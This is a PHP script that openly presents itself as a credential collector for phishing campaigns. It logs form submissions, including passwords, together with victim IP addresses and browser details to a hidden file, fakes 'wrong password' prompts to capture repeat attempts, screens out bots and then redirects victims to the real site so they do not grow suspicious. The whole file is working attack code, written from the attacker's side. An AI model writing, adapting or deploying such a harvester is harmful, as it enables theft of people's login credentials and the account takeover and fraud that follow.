<?php
/*
 * This PHP script is intended to be used during phishing attempts as a credentials
 * collector linked to a backdoored HTML <form> action parameter. The collected data
 * can be transmitted to a specified login backend.
 */

try {
    // ============================ CONFIGURATION ============================

    // Filename for harvested data. For CSV logging method, '.csv' will be appended.
    // Keep the filename not guessable to avoid forceful browsing against your own phishing box.
    $harvest_filename = 'harvester_phishing_campaign_0123456789abcdef.txt';

    // Target URL used for posting the form (form's 'action' attribute value).
    $post_url = 'https://TARGET.SITE/LOGIN';

    // Resend post data to the redirect address?
    // If set to false, the user will be simply redirected to the $redirect address or
    // if it's empty, to the $post_url address.
    $resend_post_data = false;

    // Target to redirect to after collecting input data, in case of an error or when $resend_post_data = false.
    // If left empty, the script will use $post_url value.
    $redirect = '';

    // Type of page redirection:
    // - 'js' - Using 'self.location.href'
    // - 'js_parent' - Used to escape from an iframe'd resource and reload the parent
    // - 'meta' - Using meta http-equiv refresh
    $redirect_type = 'js_parent';

    // URL for the "wrong password" message redirection (applicable only if $password_retry is set to more than 1).
    // You can use this to display a 'wrong password' error message in the phish login form and specify where to redirect the user after multiple login tries.
    // If left empty, the page will simply be reloaded.
    $wrong_password_url = '';

    // Specifies how many login attempts the user has to try before redirection to the real website kicks in (must be set to 1 or more).
    $password_retry = 2;

    // If set to true, everyone, regardless of their user agent, will be logged.
    // Otherwise, only valid, recognized user agents (excluding bots or those who tamper with the setting) will be logged.
    $log_everyone = false;

    // Set this variable to:
    // - 'csv' - to collect results in CSV format
    // - 'print_r' - to use the PHP 'print_r' function
    // - 'both' - to create both files and use them both (default)
    $log_format = 'both';

    $csv_separator = ' | ';

    // Specifies whether to include metadata such as User Agent and Remote Addr (victim IP) in the harvesting log.
    $show_meta_data = true;

    // Exclude specific clients based on their VISITOR_ID value (16-byte values).
    $exclude_visitors = array('1234567890abcdef');

    // ============================ END OF CONFIGURATION ============================

    function get_value($arr, $k) {
        if (array_key_exists($k, $arr)) {
            return $arr[$k];
        }
        return "";
    }

    function collect_columns_array($arraylog) {
        return array_keys(flatten($arraylog));
    }

    function flatten($array, $prefix = '') {
        $result = array();
        foreach ($array as $key => $value) {
            if (is_array($value)) {
                $result = $result + flatten($value, $prefix . $key . '.');
            } else {
                $result[$prefix . $key] = $value;
            }
        }
        return $result;
    }

    function log_file_init($arraylog) {
        global $log_format;
        global $harvest_filename;
        global $csv_separator;

        if ($log_format == 'both' || $log_format == 'print_r') {
            file_put_contents($harvest_filename, '');
        }
        if ($log_format == 'both' || $log_format == 'csv') {
            $columns = implode($csv_separator, collect_columns_array($arraylog));
            file_put_contents($harvest_filename . '.csv', $columns . "\n");
        }
    }

    function log_append($arraylog) {
        global $log_format;
        global $harvest_filename;
        global $csv_separator;

        if ($log_format == 'both' || $log_format == 'print_r') {
            file_put_contents($harvest_filename, print_r($arraylog, true), FILE_APPEND);
        }
        if ($log_format == 'both' || $log_format == 'csv') {
            $flattenarray = flatten($arraylog);
            $line = '';

            foreach ($flattenarray as $k => $v) {
                $line .= $v . $csv_separator;
            }

            $line = substr($line, 0, -strlen($csv_separator));
            file_put_contents($harvest_filename . '.csv', $line . "\n", FILE_APPEND);
        }
    }

    function validate_user_agent() {
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $user_agent_len = strlen($user_agent);
        $user_agent_keywords_found = 0;

        $keywords = array(
            'Chrome', 'Chromium', 'CriOS', 'Fedora', 'Firefox', 'Gecko',
            'Intel', 'iPhone', 'KHTML', 'Linux', 'Macintosh', 'Mobile',
            'Mozilla', 'Safari', 'Trident', 'Ubuntu', 'Version', 'Win64',
            'Windows', 'WOW64', 'x86_64', 'Android', 'Phone'
        );

        foreach ($keywords as $keyword) {
            if (stripos($user_agent, $keyword) !== false) {
                $user_agent_keywords_found++;
            }
        }

        return ($user_agent_keywords_found >= 3 && $user_agent_len > 60);
    }

    function redirector($url, $return = false)
    {
        global $redirect_type;
        switch ($redirect_type) {
            case 'js':
                $ret = '<script>self.location.href="' . $url . '";</script>';
                break;
            case 'js_parent':
                $ret = '<script>window.parent.location.href="' . $url . '";</script>';
                break;
            default:
                $ret = '<meta http-equiv="refresh" content="0; url=' . $url . '" />';
                break;
        }
        if ($return) {
            return $ret;
        } else {
            echo $ret;
        }
    }

    // CODE STARTS HERE

    @error_reporting(0);

    session_start();
    setcookie(session_name(), session_id(), time() + 7776000); // cookie for 90 days

    if (empty($_POST)) {
        throw new Exception("POST is empty.");
    }

    $_SESSION['phishing_counter'] = isset($_SESSION['phishing_counter']) ? $_SESSION['phishing_counter'] + 1 : 1;

    if (empty($redirect)) {
        $redirect = $post_url;
    }
    if (isset($_GET['redir'])) {
        $redirect = $_GET['redir'];
    }

    $to_report_array = $_POST;
    $to_report_array['meta'] = array();

    // Collect some metadata
    $to_copy_from_server = array(
        "HTTP_X_FORWARDED_FOR", "REMOTE_ADDR", "HTTP_REFERER", "HTTP_USER_AGENT", "HTTP_HOST"
    );

    foreach ($to_copy_from_server as $key) {
        if (array_key_exists($key, $_SERVER)) {
            $to_report_array['meta'][$key] = $_SERVER[$key];
        }
    }

    $date = date('Y-m-d H:i:s');
    $to_report_array['meta']['TIMESTAMP'] = $date;

    // Add information about password-entry attempt to the logfile.
    $to_report_array['meta']['COMMENT'] = "Password retries for that user: " . $_SESSION['phishing_counter'] . ". ";

    if ($_SESSION['phishing_counter'] >= $password_retry) {
        $to_report_array['meta']['COMMENT'] .= 'Considered phished (+). ';
    }

    // Compute a unique visitor ID to grep the harvest log based on that ID.
    $exclude = false;
    $id = sha1(
        get_value($_SERVER, 'HTTP_USER_AGENT') .
        get_value($_SERVER, 'REMOTE_ADDR') .
        get_value($_SERVER, 'HTTP_ACCEPT') .
        get_value($_SERVER, 'HTTP_ACCEPT_CHARSET') .
        get_value($_SERVER, 'HTTP_ACCEPT_LANGUAGE')
    );

    $to_report_array['meta']['VISITOR_ID'] = substr($id, 0, 16);

    if (in_array($to_report_array['meta']['VISITOR_ID'], $exclude_visitors)) {
        $exclude = true;
    }

    if (!$show_meta_data) {
        unset($to_report_array['meta']);
    }

    // Log to file only if not a bot, valid UA, not excluded, or if logging everyone
    if (!$exclude && ($log_everyone || validate_user_agent())) {
        if (!file_exists($harvest_filename)) {
            log_file_init($to_report_array);
        }
        log_append($to_report_array);
    }

    if ($password_retry > 1) {
        if ($_SESSION['phishing_counter'] < $password_retry) {
            $url = (!empty($wrong_password_url)) ? $wrong_password_url : $_SERVER['REQUEST_URI'];
            header('Location: ' . $url);
            die();
        }
    }

    if ($_SESSION['phishing_counter'] > $password_retry) {
        $_SESSION['phished_already'] = 1;
        redirector($redirect);
    } else {
        header('Content-Type: text/html; charset=utf-8');

        if (!$resend_post_data) {
            redirector($redirect);
        } else {
            echo "<html><head></head><body>";
            echo "<form action='" . $post_url . "' method='post' name='frm'>";

            foreach ($_POST as $a => $b) {
                if (is_array($b)) {
                    foreach ($b as $bname => $bval) {
                        echo "<input type='hidden' name='" . htmlentities($a) . "[" . $bname . "]' value='" . htmlentities($bval) . "'>";
                    }
                } else {
                    echo "<input type='hidden' name='" . htmlentities($a) . "' value='" . htmlentities($b) . "'>";
                }
            }
            echo "</form><script type='text/javascript'>document.frm.submit();</script></body></html>";
        }
    }
} catch (Exception $e) {
    // We can't take the risk of not redirecting the victim to the desired website,
    // because such a victim could become anxious or investigate the issue further,
    // thus compromising our campaign. That's the purpose of the try..catch statement
    // applied here.
    redirector($redirect);
}
?>